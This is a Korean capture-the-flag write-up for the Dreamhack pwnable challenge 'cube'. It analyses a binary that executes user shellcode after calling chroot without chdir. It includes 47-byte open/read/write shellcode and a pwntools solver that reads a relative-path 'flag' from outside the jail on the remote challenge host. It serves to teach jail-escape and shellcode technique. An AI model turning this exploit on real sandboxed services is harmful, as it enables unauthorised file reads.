# ✏️ cube

> Category: pwnable

## 📄 Vulnerability & Code Analysis

배포 파일은 8KB짜리 PIE 바이너리 하나다. 심볼이 남아 있어 함수는 `init`, `sandbox`, `main` 세 개가 전부다.

```text
[*] '/home/kirin/pwnable_lab/pwnable/wargames/cube/cube'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

### main

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]

  buf = mmap(nullptr, 0x400u, 7, 34, -1, 0);   // prot = 7 = READ|WRITE|EXEC
  init();
  sandbox();
  printf("Give me shellcode: ");
  read(0, buf, 0x50u);
  ((void (*)(void))buf)();
  return 0;
}
```

의도가 노골적이다. `mmap(prot=7)`으로 RWX 영역을 만들고, 거기에 입력을 받아 그대로 호출한다. NX가 켜져 있어도 무의미하고, PIE·RELRO·카나리도 이 경로에서는 아무것도 막지 않는다. **`checksec` 표가 경로를 정해주지 않는 문제**다.

얻는 능력은 한 문장으로 정리된다.

> RWX 메모리에 내가 보낸 바이트가 그대로 들어가고 그 주소로 바로 `call`이 일어난다. 단, 쓸 수 있는 건 `read`가 받는 **0x50(80)바이트**뿐이다.

버퍼가 0x400인 것은 여유 공간일 뿐, 실제 제약은 80바이트다.

### sandbox

```c
int sandbox()
{
  return chroot("/home/cube/cube_box");
}
```

이름은 `sandbox`지만 seccomp가 아니다. Imports에는 `chroot`, `mmap`, `read`, `printf`, `setvbuf`밖에 없다. `prctl`도 `seccomp_*`도 없으므로 **시스템 콜 필터는 존재하지 않는다.** 즉 `execve`는 커널 차원에서 허용된다.

그런데도 `execve("/bin/sh")`는 실패한다. 이유가 seccomp가 아니라 `chroot` 자체라는 것이 이 문제의 출발점이다.

### chroot가 바꾸는 것, 바꾸지 않는 것

`chroot(path)`는 이 프로세스가 보는 `/`의 위치를 옮긴다. 호출 이후 절대경로는 모두 새 루트 아래로 재해석된다.

```text
내가 쓰는 경로        커널이 실제로 찾는 경로
/bin/sh         →   /home/cube/cube_box/bin/sh
/flag           →   /home/cube/cube_box/flag
```

그래서 `/bin/sh`는 존재하지 않고, 셸을 띄울 수 없으니 `cat`도 쓸 수 없다. 남는 길은 `open`/`read`/`write`를 직접 호출하는 **ORW 셸코드**다.

path traversal도 길이 아니다. 커널은 chroot된 루트에서 `..`를 만나면 자기 자신으로 묶어버린다(clamp). `/../../../flag`는 그냥 `/flag`, 즉 `cube_box/flag`가 된다. 이것은 `chroot`의 설계 의도이고 버그가 아니다.

핵심은 다른 데 있다. 리눅스가 경로를 해석할 때 쓰는 기준점은 **두 개**다.

| 경로 종류 | 기준점 | `chroot`가 바꾸는가 |
|---|---|---|
| 절대경로 `/flag` | 루트 디렉터리 `/` | **바꾼다** → `cube_box` |
| 상대경로 `flag` | **cwd** (현재 작업 디렉터리) | 바꾸지 않는다 |

`chroot`는 루트만 건드린다. cwd는 별개의 값이고, 이것을 옮기는 건 `chdir()`이라는 다른 시스템 콜이다. 그래서 chroot로 감옥을 만들 때는 관례적으로 두 개를 같이 부른다.

```c
chroot("/home/cube/cube_box");
chdir("/");                      // ← 루트 안으로 들어가기
```

**`sandbox()`에는 `chdir`이 없다.** 문은 잠겼는데 발은 아직 밖에 있는 상태다. cwd는 chroot 이전 그대로 `/home/cube`이고, 이 위치는 새 루트의 바깥이다.

### 취약점

`chroot()`를 `chdir()` 없이 호출한 것. 감옥 안에서 탈출하는 문제가 아니라, **애초에 감옥 밖을 가리키는 좌표계가 하나 남아 있는** 문제다.

```text
절대경로  "/flag"   →  /home/cube/cube_box/flag   (감옥 안, 없음)
상대경로  "flag"    →  /home/cube/flag            (감옥 밖, 진짜 파일시스템)
```

`open`에 `/`로 시작하지 않는 문자열만 넘기면 `chroot`는 아무 일도 하지 않는다.

## 🗡️ Exploit / Solver Strategy

목표는 상대경로 `"flag"`를 여는 ORW 셸코드를 80바이트 안에 집어넣는 것이다. ORW는 세 번의 시스템 콜이고, 각 레지스터에 무엇이 들어가는지만 정리하면 끝난다.

| 순서 | 호출 | `rax` | `rdi` | `rsi` | `rdx` |
|---|---|---|---|---|---|
| 1 | `open` | 2 | `"flag"` 문자열의 주소 | 0 (O_RDONLY) | — |
| 2 | `read` | 0 | **fd** = 1번의 결과 | 버퍼 주소 | 읽을 길이 |
| 3 | `write` | 1 | 1 (stdout) | 같은 버퍼 주소 | **읽은 수** = 2번의 결과 |

syscall은 반환값을 `rax`에 주고, 다음 호출에서 `rax`는 호출 번호로 덮어써야 한다. 그래서 ORW 코드의 대부분은 **결과를 받자마자 다른 레지스터로 옮기는 두 줄**이다 — `mov rdi, rax`(fd)와 `mov edx, eax`(읽은 바이트 수).

세부 결정은 세 가지였다.

**1. `"flag"`의 NULL 종료를 공짜로 얻는다.** x86-64에는 32비트 레지스터에 쓰면 상위 32비트가 자동으로 0이 되는 규칙(zero-extension)이 있다. `"flag"`는 리틀엔디안으로 `0x67616c66`, 정확히 4바이트다.

```asm
    mov  eax, 0x67616c66    ; rax = 0x0000000067616c66  ("flag" + NULL)
    push rax                ; 스택 최상단에 "flag\0\0\0\0"
    push rsp
    pop  rdi                ; push 직후의 rsp 가 곧 문자열의 주소
```

NULL을 따로 push할 필요가 없어 파일명 처리가 네 줄로 끝난다.

**2. 상수와 레지스터 이동은 `push`/`pop`으로 만든다.** `push 2; pop rax`는 3바이트인데 `mov eax, 2`는 5바이트에 널 바이트 3개다. `push rsp; pop rdi`는 2바이트, `mov rdi, rsp`는 3바이트. 이 문제는 널 바이트 제약은 없지만 80바이트 제약이 있으므로 짧은 쪽을 택했다.

**3. `rdx`는 통째로 덮어쓴다.** `main`이 `call rdx`로 셸코드를 호출하기 때문에 진입 시점의 `rdx`에는 mmap 주소라는 쓰레기 값이 들어 있다. `mov dl, ...` 같은 8비트 쓰기는 상위 비트를 남기므로(zero-extension은 32비트 쓰기에만 적용된다) 터무니없는 길이가 된다. `push 0x100; pop rdx`로 64비트 전체를 세팅했다.

버퍼는 `rsp - 0x100`을 썼다. 파일명을 올려둔 스택 아래의 빈 공간이라 아무것도 건드리지 않는다.

완성된 셸코드는 **47바이트**로, 제한 80바이트에 여유가 있다.

## 💻 Final Payload or Solver

```python
#!/usr/bin/env python3
from pwn import *

p = remote('host3.dreamhack.games', 10411)
# p = process('./cube')
e = ELF('./cube')
context.arch = 'amd64'


shellcode = asm('''
    /* ---- open("flag", O_RDONLY) ---- */
    mov  eax, 0x67616c66
    push rax
    push rsp
    pop  rdi                    /* rdi = 문자열 주소 */
    xor  esi, esi               /* rsi = 0 (O_RDONLY) */
    push 2
    pop  rax                    /* rax = 2 (open) */
    syscall                     /* -> rax = fd */

    /* ---- read(fd, rsp-0x100, 0x100) ---- */
    mov  rdi, rax               /* rdi = fd */
    push rsp
    pop  rsi
    sub  rsi, 0x100
    push 0x100
    pop  rdx                    /* rdx = 0x100 */
    xor  eax, eax               /* rax = 0 (read) */
    syscall

    /* ---- write(1, buf, n) ---- */
    mov  edx, eax
    push 1
    pop  rax                    /* rax = 1 (write) */
    push 1
    pop  rdi                    /* rdi = 1 (stdout) */
    syscall
''')

p.sendafter(b'Give me shellcode: ', shellcode)
p.interactive()
```

로컬 테스트는 셸코드 자체의 검증까지만 유효하다. root 권한이 없으면 `chroot`가 그냥 실패하고 넘어가므로, 감옥이 만들어지지 않은 상태에서 `open("flag")`가 성공할 뿐이다. 탈출이 실제로 동작하는지는 원격에서만 확인된다.

## 🏳️ cat flag

```text
$ python cube.py
[+] Opening connection to host3.dreamhack.games on port 10411: Done
[*] '/home/kirin/pwnable_lab/pwnable/wargames/cube/cube'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] Switching to interactive mode
DH{<FLAG_REDACTED>}
```

## 🔑 Key Takeaways

- `chroot()`는 `/`의 의미만 바꾼다. cwd는 `chdir()`로 따로 옮겨야 하고, 둘 중 하나라도 빠지면 상대경로가 감옥을 그대로 통과한다.
- chroot된 루트에서 `..`는 자기 자신으로 clamp된다. path traversal은 통하지 않으므로, 탈출 경로는 `..`가 아니라 **cwd**다.
- `sandbox`라는 함수 이름이 seccomp를 뜻하지 않는다. 필터가 있는지는 Imports(`prctl`, `seccomp_*`)로 확인하고, 있으면 `seccomp-tools dump`로 규칙을 본다.
- `mmap(prot=7)`이 있으면 NX는 의미가 없다. 보호 기법 표는 경로를 정해주지 않는다.
- 셸코드 길이를 줄이는 기본 기법: 상수는 `push`/`pop`, 0은 `xor`/`cdq`, 4바이트 문자열의 NULL 종료는 32비트 쓰기의 zero-extension.
- 진입 시점의 레지스터에는 쓰레기 값이 들어 있다. 길이 인자처럼 치명적인 자리는 하위 바이트만 쓰지 말고 64비트 전체를 세팅한다.
